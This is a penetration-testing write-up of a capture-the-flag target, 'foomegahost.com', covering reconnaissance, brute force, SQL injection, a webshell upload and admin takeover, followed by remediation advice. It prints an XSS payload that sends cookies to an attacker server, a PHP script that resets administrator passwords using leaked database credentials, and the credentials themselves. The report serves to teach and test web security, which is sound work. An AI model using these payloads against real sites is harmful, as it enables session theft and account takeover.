---
description: CTF Blackbox testing of "foomegahost.com"
---

# Pentesting Report

## Executive Summary

During the blackbox pentesting of `foomegahost.com`, several vulnerabilities were discovered that pose a significant risk to the website and its users. The website is susceptible to multiple vulnerabilities, including Local File Inclusion (LFI), Cross-Site Scripting (XSS) and account takeover including admin account.

The LFI vulnerability was discovered in the website's file upload feature, which allows an attacker to inject malicious code and execute arbitrary commands on the server. This can result in data theft, server compromise, and unauthorized access. The XSS vulnerability was found at various sections of the website, which allows an attacker to inject malicious code into a web page, steal user data, session cookies, and sensitive information.

The user account takeover vulnerability was discovered in the login feature of the website. Attackers can use brute-force attacks to gain access to the user's account and steal sensitive information. _**The admin account takeover vulnerability was found in the website's administrative panel**_, which allows an attacker to gain access to the administrator's account and modify, delete, or steal sensitive information.

Subdomain enumeration using several tools and manual testing revealed additional subdomains: `m`, `me` and `fmh-intranetarea`. The scans detected that the URL `http://m.foomegahost.com/ws/service.wsdl` exposes services that should only be available for testing purposes and should not be exposed to the world in the production environment. Finally, the website was found to be vulnerable to SQL injection. We recommend immediate action to fix the vulnerabilities and implement security best practices to prevent any future attacks.

## Vulnerability report

### Information Gathering

Information gathering is a critical step in the reconnaissance phase of any security assessment, as it allows for the identification of potential attack vectors and vulnerabilities that an attacker may leverage. It helps security professionals to understand the target system, its configuration, and services running on it, thereby enabling them to design an effective security strategy.

#### Nmap Scan

`Nmap` is a powerful open-source network scanner used for network exploration, management, and security auditing. It is capable of discovering hosts and services on a network, mapping network topology, and identifying potential security threats. `Nmap` offers various scanning techniques, such as ping scans, port scans, and version detection, making it an essential tool for network enumeration and reconnaissance. The screenshot of the `Nmap` results is as given below:

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption><p>Nmap Scan results</p></figcaption></figure>

#### Analysis of the scan results

Port `53`: This port is open and runs `Microsoft DNS 6.1.7601 (1DB14556)` on `Windows Server 2008 R2 SP1`.

Port `80`: This port is open and runs `Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)`. Potentially risky methods like `TRACE` and disallowed entries in robots.txt for `/ws/` and `/ws/service.wsdl` were found. This could indicate a vulnerability that allows for unauthorized access or information disclosure.

Port `3389`: This port is open and runs `ssl/ms-wbt-server`. The SSL certificate is not valid before `2023-04-07T18:24:04` and not valid after `2023-10-07T18:24:04`. This could indicate a vulnerability that allows for man-in-the-middle attacks or other types of SSL-related attacks. Additionally, the `RDP-NTLM-Info` provides information about the computer, domain name, product version, and system time, which could be used in an attack.

Port `49155`: This port is open and runs Microsoft Windows RPC. No vulnerabilities were identified for this port.

### SubDomain Enumeration

Subdomain enumeration is the process of discovering subdomains for a given domain name. This technique is often used by security professionals to identify potential attack surfaces and to find new targets for reconnaissance and exploitation. A number of tools were used in the process. The relevant screenshots are given below:

#### Fierce

`Fierce` is a subdomain enumeration tool that uses a dictionary attack to discover subdomains. It is known for its speed and effectiveness in finding subdomains for a target domain. However, we were not successful in using it. In the next subsection, we will investigate the error using the `dig` command.

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption><p>Fierce subdomain enumeration tool</p></figcaption></figure>

#### Dig Command

`Dig` is a command-line tool that can be used to perform DNS lookups and discover subdomains. It is a standard utility in most Linux distributions and can be used to perform advanced DNS queries. The screenshots are given below:

<figure><img src="../.gitbook/assets/image (20).png" alt="" width="375"><figcaption><p>Dig Command</p></figcaption></figure>

To trace the DNS resolution process for the **`foomegahost.com`** domain, we used the command **`dig +trace foomegahost.com`**. This command allows us to see the entire path taken by the DNS queries made to resolve the domain name. We can see each DNS server that was queried, as well as the responses received from each server. This information is useful for troubleshooting DNS issues, as it can help identify where in the resolution process a problem may be occurring.

<figure><img src="../.gitbook/assets/image (21).png" alt="" width="375"><figcaption><p>Dig command</p></figcaption></figure>

**Analysis**: After running the **`dig`** command, it seems that the DNS server at **`foomegahost.com`** is returning a **`FORMERR`** status, indicating a format error in the DNS query. This error is preventing us from using the `fierce` tool for subdomain enumeration.

#### [Subbrute.py](http://subbrute.py)

`subbrute.py` is a Python-based subdomain enumeration tool that uses a brute-force approach to discover subdomains. It uses a large list of words and phrases to generate a comprehensive list of subdomains for a given domain name.

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption><p>Subbrute Command</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (23).png" alt="" width="375"><figcaption><p>Subbrute Results</p></figcaption></figure>

#### wfuzz

`wfuzz`is a web application security testing tool that can also be used for subdomain enumeration. It is a popular tool among security professionals due to its flexibility and advanced features. `wfuzz` uses a variety of techniques to discover subdomains, including brute-force attacks and dictionary attacks.

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption><p>Wfuzz</p></figcaption></figure>

#### Conclusion

During the subdomain enumeration phase, two additional subdomains were discovered: `m` and `me`. Subdomain enumeration is a process used by security professionals to identify potential attack surfaces and to find new targets for reconnaissance and exploitation. Several tools were used in the process, including `fierce`, `Dig`, `subbrute.py`, and `wfuzz`.

### Enumerating Directories and Pages

Enumerating directories and pages is an important step in web application testing, as it helps to identify hidden or vulnerable areas of the website that can be targeted by attackers. By discovering these directories and pages, security testers can uncover potential security risks and take steps to mitigate them.

#### Dirbuster

`dirbuster` is a popular tool used for directory enumeration in web application testing. It works by brute-forcing common directory and file names and can be configured to use different wordlists and extensions. `dirbuster` can help to identify hidden or restricted directories and pages, as well as common vulnerabilities such as directory traversal attacks. The `dirbuster` results for `foomegahost.com`are given below:

```clojure
DirBuster 1.0-RC1 - Report
<http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>
Report produced on Sat Apr 08 23:09:10 EDT 2023
--------------------------------
<http://foomegahost.com:80>
--------------------------------
Directories found during testing:
Dirs found with a 403 response:
/img/
/js/
/img/facilities/
/img/slide/
/img/icons_features/
/img/sponsors/
/img/users/
/js/nav/
/css/
/js/fancybox/
/img/servers/
/js/totop/
/js/efect_switcher/
/include/
/js/slide/
/img/team/
/img/slide/slides/
/img/social/
/css/fonts/
/css/slide/

Dirs found with a 200 response:
/
--------------------------------
Files found during testing:

Files found with a 200 responce:

/contact.php
/about.php
/index.php
/promotions.php
/shared_hosting.php
/virtual_servers.php
/dedicated_servers.php
/js/nav/tinynav.js
/js/nav/superfish.js
/js/jquery-1.8.3.min.js
/js/nav/jquery.sticky.js
/js/fancybox/jquery.fancybox-1.3.1.js
/js/totop/jquery.ui.totop.js
/js/efect_switcher/jquery.content-panel-switcher.js
/js/bootstrap.js
/js/jquery-func.js
/include/get_visitor.php
/js/slide/camera.js
/include/header.php
/include/nav.php
/include/scripts.php
/include/footer.php
/include/sponsor.php
/include/config.php
/include/connect.php

Files found with a 302 responce:

/include/login.php

--------------------------------
```

`m.foomegahost.com`

<figure><img src="../.gitbook/assets/image (27).png" alt="" width="375"><figcaption><p>Dirbuster GUI tool</p></figcaption></figure>

```clojure

DirBuster 1.0-RC1 - Report
<http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>
Report produced on Mon Apr 10 08:00:35 EDT 2023
--------------------------------

<http://m.foomegahost.com:80>
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/ws/

Dirs found with a 403 response:

/img/
/js/
/css/
/css/fonts/
/css/slide/
/css/bootstrap/

--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.html
/js/core.js
/js/jquery-1.8.3.min.js
/js/jquery.xml2json.js
/ws/index.php
/ws/config.php

--------------------------------
```

During the directory enumeration phase, the `Dirbuster` tool was used to identify directories and files on the `foomegahost.com` and `m.foomegahost.com` domains. The results of the `Dirbuster` scan showed several directories and files that were accessible on the server. For `m.foomegahost.com`, there were two directories found with a 200 response: `/` and `/ws/`.

### Web Vulnerability Scanning

Web vulnerability scanning is the process of identifying security flaws in web applications using automated tools. It is a crucial step in ensuring the security of web applications and preventing potential cyber attacks. `Nikto`, `ZAP (Zed Attack Proxy)`, and `Burp Suite` are some of the popular tools used for web vulnerability scanning.

#### Nikto Scan

`Nikto` is an open-source web server scanner designed to identify potential vulnerabilities and security weaknesses in web applications. It performs a comprehensive analysis of a website and its web server, including common vulnerabilities such as outdated software, misconfigurations, and insecure server settings. `Nikto` is widely used by security professionals to assess the security posture of web applications and identify potential attack vectors. The screenshots of scan results of `Nikto` are given below:

`http://foomegahost.com`

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption><p>Nikto scan : foomegahost.com</p></figcaption></figure>

`http://me.foomegahost.com`

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption><p>Nikto scan : me.foomegahost.com</p></figcaption></figure>



This scan results by `Nikto` shows a few vulnerabilities and potential security issues that can be addressed:

1. Missing `X-Frame-Options` header: The anti-clickjacking `X-Frame-Options` header is not present on the root directory (`"/"`), which can allow an attacker to use the site in a clickjacking attack.
2. Missing `X-Content-Type-Options` header: The `X-Content-Type-Options` header is not set, which could allow the user agent to render the content of the site in a different fashion to the MIME type, potentially exposing it to cross-site scripting (XSS) attacks.
3. Insecure `PHPSESSID` cookie: The `PHPSESSID` cookie is created without the `httponly` flag, which makes it vulnerable to XSS attacks. This flag helps to prevent client-side scripts from accessing the cookie, which can contain sensitive information.

Overall, the scan report indicates that the server is running `Microsoft IIS 7.5` and has a few security issues that can be addressed to improve its security posture.

#### ZAP

The `ZAP scan` has detected that the URL `http://m.foomegahost.com/ws/service.wsdl` exposes services that should only be available for testing purposes and should not be exposed to the world in the production website. The report notes the detection of a `WSDL file` and recommends limiting its visibility to testing purposes only. The report also references two OWASP vulnerabilities related to security misconfigurations: OWASP\_2021\_A05 and OWASP\_2017\_A06. These vulnerabilities can lead to a variety of security risks, including unauthorized access and information disclosure. It is recommended that the misconfigurations be addressed promptly to mitigate potential risks to the organization's security posture.

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption><p>ZAP Scan</p></figcaption></figure>

### BruteForce Attack

We will attempt a brute force attack on the login page of `me.foomegahost.com`. The results of the brute force attack reveal the username `test` and password `password1234`.

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption><p>Landing Page of me.foomegahost.com</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption><p>Bruteforce password using wfuzz</p></figcaption></figure>

### SQL Injection

SQL injection is a type of web application vulnerability that allows an attacker to execute malicious SQL statements to gain unauthorized access to a database.

#### SQLMap

`SQLMap` is a powerful open-source tool used to detect and exploit SQL injection flaws in web applications. It automates the process of identifying SQL injection vulnerabilities and exploiting them to extract sensitive data from the database.

The results of the SQL injection using `SQLMap` are provided below. However, neither webpage was found to be susceptible to SQL injection attacks.

`me.foomegahost.com/include/login.php`

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Capture POST request in a .txt file</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Sqlmap tool</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>Sqlmap tool : output</p></figcaption></figure>

`m.foomegahost.com/ws/`

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Capture POST request in a .txt file</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>Sqlmap tool : output</p></figcaption></figure>

### Service.wsdl

During the web vulnerability scanning phase, it was identified that the `service.wsdl` endpoint was accessible to the world in the production environment. This endpoint is used to expose services that should only be available for testing purposes. This vulnerability can lead to a variety of security risks, including unauthorized access and information disclosure, especially if the endpoint is used for SOAP services. Attackers can use this information to craft malicious requests, which can exploit vulnerabilities in the web application and compromise its security. It is recommended to limit the visibility of such endpoints in the production environment and ensure that they are only accessible to authorized users. Proper access controls should be implemented to prevent unauthorized access to these endpoints. The screenshot is given below:

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>Expose wsdl service</p></figcaption></figure>

#### SQL Injection

We will now check if the elements of the exposed service are vulnerable to SQL injection attacks. We will study the request in Burp.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>Capture request in Burp suite</p></figcaption></figure>

Now, we will run the `SQLMap` against the vulnerable elements.

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>Sqlmap tool</p></figcaption></figure>

The `POST` request is given in the `request-ID.txt` file.

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>Capture the POST request in a .txt file</p></figcaption></figure>

The following databases and tables are exposed due to the SQL injection Vulnerability.

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption><p>Sqlmap output : Exposed tables</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>Sqlmap output : Exposed tables</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>Sqlmap output : Exposed tables</p></figcaption></figure>

Payloads for which the `ticketID` is vulnerable are given below:

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Crackstation can be used to find the plain text of the password for the `test` user. We confirm that it is same `password1234` as was discovered in the bruteforce attack section. Other hash cracking tools like `Hashcat` and `Jhon the Ripper` can also be used to crack the hashes.

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dfeecd1e-feb9-4fb1-8cec-e31f230813fe/Untitled.png)

Now, we will check if other elements are also vulnerable to the SQL injection attacks. We, did not find other elements to be susceptible to the attack.

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### Access to Support

#### Login as `test` User

We were able to login using the username (`test`) and password (`password1234`) obtained through the bruteforce attack.

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### LFI Vulnerability

Local File Inclusion (LFI) vulnerability occurs when an application allows an attacker to include a file on the server that is not intended to be included. This can allow an attacker to execute arbitrary code, read sensitive files or even gain complete control over the server.

To check for LFI vulnerability, one approach is to try to upload a PHP file and change the file extension to an allowed file type like `.png`, and then intercept the request using Burp Suite. Then, we can modify the file extension back to PHP and forward the request. If the server processes the file as PHP instead of an image, it indicates that the application is vulnerable to LFI.

It's important to note that exploiting an LFI vulnerability can have serious consequences, including data theft, server compromise, and unauthorized access to sensitive information. Therefore, it's crucial to identify and address these vulnerabilities promptly to minimize the risk of exploitation.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/223c21fd-d0b4-4a0d-ae89-dad2c583d468/Untitled.png)

In the JavaScript code of the page source, we can see that the extensions are checked at the client level instead of the server level. This makes the website vulnerable to LFI (Local File Inclusion) attacks.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7b06e45b-bd32-4d2f-87a4-be660299ab79/Untitled.png)

#### Building PHP webshell

We obtained a `PHP` webshell from [revshells.com](http://revshells.com/) for testing purposes. We intercepted the request using the Burp Suite and changed the extension back to `.php`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/822910f4-d7fc-47ce-9a2a-c74254b8285a/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f1c6a9bb-83f5-4b5e-80d5-f5c5c84a4589/Untitled.png)

#### Launching the PHP Shell

To run our PHP webshell, we first need to go to the tickets area and then click on the attachments. This will allow us to obtain a reverse shell back on our Kali machine.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dfc324fb-e2fe-4f75-8066-ab1d6f37d15b/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6bcc3bbc-6c6b-472f-a3fc-95e68aa34514/Untitled.png)

After gaining access to the Kali machine's shell, we can begin enumerating and searching for interesting files, such as `config.php`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3be2da10-bd41-4554-ac03-cf89c0ef8522/Untitled.png)

#### Reading `config.php`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7db5ae10-e62a-4130-969c-a835d33da9a6/Untitled.png)

### Access to Intranet Area

#### [fmh-intranetarea.foomegahost.com](http://fmh-intranetarea.foomegahost.com)

According to the information found in the `config.php` file, the subdomain `fmh-interanetarea.` is mentioned. Upon visiting the `fmh-interanetarea.` subdomain, we were able to access its webpage. The screenshots are attached below. This subdomain seems to be for intranet login.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e589a89-ada3-4df0-b075-5c9f57d73722/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7a86beb3-4ec0-460e-8d97-91b605d0e48e/Untitled.png)

### Admin Access

After identifying the LFI vulnerability and the `config.php` file that contains the details to connect to `MySQL`, we will attempt to change the password of users with `Administrator` rights, identified by the ID `1`. We will write a `.php` script that changes the password to `admin`, and upload it to change the passwords.

```clojure
<?php

// Define database connection parameters
$config['DB']['USERS']['dbname'] = "foomegahost";
$config['DB']['USERS']['dbhostname'] = "127.0.0.1:6603";
$config['DB']['USERS']['user'] = "res_foomegahost";
$config['DB']['USERS']['password'] = "C8COcl84QSbM9hL7EC7F";

// Create database connection
$conn = mysqli_connect($config['DB']['USERS']['dbhostname'], $config['DB']['USERS']['user'], $config['DB']['USERS']['password'], $config['DB']['USERS']['dbname']);

// Check if connection was successful
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Update password for all rows where role=1
$sql = "UPDATE user SET password='21232f297a57a5a743894a0e4a801fc3' WHERE role=1";
$result = mysqli_query($conn, $sql);

// Check if update was successful
if ($result) {
    // Print the updated user table
    $sql = "SELECT * FROM user";
    $result = mysqli_query($conn, $sql);

    if (mysqli_num_rows($result) > 0) {
        echo "<table><tr><th>ID</th><th>Username</th><th>Password</th><th>Role</th></tr>";
        while ($row = mysqli_fetch_assoc($result)) {
            echo "<tr><td>" . $row["id"] . "</td><td>" . $row["username"] . "</td><td>" . $row["password"] . "</td><td>" . $row["role"] . "</td></tr>";
        }
        echo "</table>";
    } else {
        echo "0 results";
    }
} else {
    echo "Error updating password: " . mysqli_error($conn);
}

// Close database connection
mysqli_close($conn);

?>
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/afd57e63-fbc4-414a-8732-6ad6ac32441c/Untitled.png)

#### Admin Page

Now that we have changed the password for the `admin` user, we can log in to the admin area using the `admin` username and `admin` password.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1e8aa4f-c629-4914-a32e-ac6656734128/Untitled.png)

### Miscellaneous

#### Information Disclosure

Listing the names of employees and clients on a website may pose a security risk as it can potentially allow attackers to gather sensitive information about them. This information can be misused for targeted attacks such as spear phishing, social engineering, or identity theft. It is important for organizations to carefully consider the information they make public on their website and implement appropriate measures to protect their employees and clients.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7d5b7515-2231-499f-b537-a8582a115f05/Untitled.png)

#### Admin Username Disclosure

If an adversary attempts to log in to the `me.foomegahost.com` members site using a non-administrator username, no particular error message is shown, but when the username `admin` is used, the site responds with a specific error message indicating the existence of the admin account. This can be exploited to carryout bruteforce attacks against the `admin` username.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6e9630b7-e272-4e88-a4ac-c84a04706f70/Untitled.png)

#### XSS Vulnerability

Cross-site scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious code, usually in the form of a script, into a vulnerable website that is then executed in a victim's web browser. This can lead to the theft of sensitive information, such as user credentials or payment information, or the hijacking of the user's session. The screenshots are attached below.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6bebaa2f-68d4-4291-8e4d-1e5084338382/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4c224f43-eb5e-4ec3-bb82-f2c5b4d3c3c8/Untitled.png)

#### Exfiltrating Cookies

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/795a3360-cba3-48f3-a579-f0b5675623b3/Untitled.png)

Additionally, the attacker can use the stolen cookies to impersonate the user and perform actions on their behalf. The following is an example proof-of-concept (PoC) showing how cookies can be exfiltrated to a Kali server using a simple XSS payload.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/613f77ba-d10e-477b-ad93-f0174da6b08e/Untitled.png)

```jsx
<script>var i=new Image();i.src="<http://172.16.5.70:8001/loot.php?q=>"+document.cookie;</script>
```

This payload creates a new image object and sets its source to a remote server, along with the user's cookie data. The remote server can now log the cookie data and use it for malicious purposes. It is important to note that XSS vulnerabilities can have serious consequences and should be addressed promptly to prevent attacks.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95fd9474-600f-4abe-aa9a-b4859eb24e92/Untitled.png)

#### SQL Injection attack in Support Form

During our security testing, we discovered that the support form on the website is vulnerable to SQL injection. This means that an attacker can exploit this vulnerability to gain unauthorized access to the database or execute malicious code. We conducted a series of tests on various parameters, and our findings revealed that the `category` parameter is particularly vulnerable.

To demonstrate the severity of this vulnerability, we have included screenshots below that show the successful exploitation of the SQL injection vulnerability through the `category` parameter. It is important to address this vulnerability as soon as possible to prevent any potential damage that could be caused by a malicious attacker.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/223c21fd-d0b4-4a0d-ae89-dad2c583d468/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/10be1dec-8262-42d6-942d-00b3455c93c7/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e853fe6f-bbf9-480d-9849-198075748826/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/67a18c8a-d50f-4fde-91cd-2228b63a0c32/Untitled.png)

## Remediation report

The vulnerabilities found during the blackbox pentesting of `foomegahost.com` pose a significant risk to the website and its users. The following recommendations should be implemented to fix the vulnerabilities and prevent future attacks.

### LFI Vulnerability

The LFI vulnerability was discovered in the website's file upload feature. To fix this vulnerability, the following measures can be taken:

* Input validation: Implement input validation to ensure that the file upload feature only accepts valid file types and does not allow file uploads with malicious content.
* File permissions: Set appropriate file permissions to restrict access to sensitive files and directories on the server.
* Sanitize file names: Sanitize file names to prevent directory traversal attacks.

### XSS Vulnerability

The XSS vulnerability was found at various sections of the website. To fix this vulnerability, the following measures can be taken:

* Input validation: Implement input validation to prevent the injection of malicious code into web pages.
* Output encoding: Use output encoding to prevent the execution of malicious code injected into web pages.
* Use Content Security Policy (CSP): Implement a content security policy to prevent the execution of untrusted scripts on web pages.

### User Account Takeover Vulnerability

The user account takeover vulnerability was discovered in the login feature of the website. To fix this vulnerability, the following measures can be taken:

* Implement two-factor authentication: Implement two-factor authentication to prevent unauthorized access to user accounts.
* Implement account lockout: Implement account lockout to prevent brute-force attacks on user accounts.

### Admin Account Takeover Vulnerability

The admin account takeover vulnerability was found in the website's administrative panel. To fix this vulnerability, the following measures can be taken:

* Implement multi-factor authentication: Implement multi-factor authentication to prevent unauthorized access to the administrative panel.
* Use a strong password policy: Enforce a strong password policy to prevent weak passwords that can be easily guessed.

### Subdomain Enumeration

Subdomain enumeration using several tools and manual testing revealed additional subdomains: `m`, `me`, and `fmh-intranetarea`. To fix this vulnerability, the following measures can be taken:

* Remove unnecessary subdomains: Remove subdomains that are not required for the functioning of the website.
* Restrict access to sensitive subdomains: Restrict access to sensitive subdomains to prevent unauthorized access and information disclosure.

### SQL Injection Vulnerability

The website was found to be vulnerable to SQL injection. To fix this vulnerability, the following measures can be taken:

* Use parameterized queries: Implement parameterized queries to prevent SQL injection attacks.
* Input validation: Implement input validation to ensure that user input is sanitized and does not contain malicious code.

### Anti-CSRF Token Missing

Upon examining the system, it was found that the anti-CSRF token is missing. This token is an essential security feature that helps prevent against Cross-Site Request Forgery attacks. Without it, the system is vulnerable to malicious requests that can cause harm to the user's sensitive data. In order to remedy this issue, we must first identify where the token should have been implemented and then take the necessary steps to add it back into the system. This will require careful planning and attention to detail, but it is imperative in order to ensure the safety and security of our users and their data.
